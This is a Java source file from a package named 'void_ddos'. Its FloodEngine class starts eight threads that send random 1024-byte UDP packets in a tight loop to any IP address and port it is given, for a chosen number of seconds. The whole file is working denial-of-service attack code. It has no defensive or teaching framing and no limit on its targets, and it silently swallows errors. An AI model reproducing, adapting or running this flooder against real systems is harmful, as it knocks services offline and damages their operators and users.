package com.void_ddos;

import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class FloodEngine {

    private final ExecutorService executor =
            Executors.newFixedThreadPool(16);
    private final List<FloodWorker> activeWorkers =
            new ArrayList<>();

    public void startFlood(String ip, int port, int durationSeconds) {
        stopAll();
        for (int i = 0; i < 8; i++) {
            FloodWorker w = new FloodWorker(ip, port, durationSeconds);
            activeWorkers.add(w);
            executor.submit(w);
        }
    }

    public void stopAll() {
        for (FloodWorker w : activeWorkers) w.stop();
        activeWorkers.clear();
    }

    static class FloodWorker implements Runnable {
        private final String ip;
        private final int port;
        private final int duration;
        private volatile boolean running = true;

        FloodWorker(String ip, int port, int duration) {
            this.ip = ip;
            this.port = port;
            this.duration = duration;
        }

        @Override
        public void run() {
            try {
                DatagramSocket socket = new DatagramSocket();
                socket.setSoTimeout(1000);
                InetAddress addr = InetAddress.getByName(ip);

                byte[] buf = new byte[1024];
                new Random().nextBytes(buf);
                DatagramPacket pkt = new DatagramPacket(
                        buf, buf.length, addr, port);

                long end = System.currentTimeMillis() +
                        (duration * 1000L);
                int count = 0;

                while (running && System.currentTimeMillis() < end) {
                    socket.send(pkt);
                    count++;
                    if (count % 1000 == 0) {
                        new Random().nextBytes(buf);
                    }
                }
                socket.close();
            } catch (Exception ignored) {}
        }

        public void stop() {
            running = false;
        }
    }
}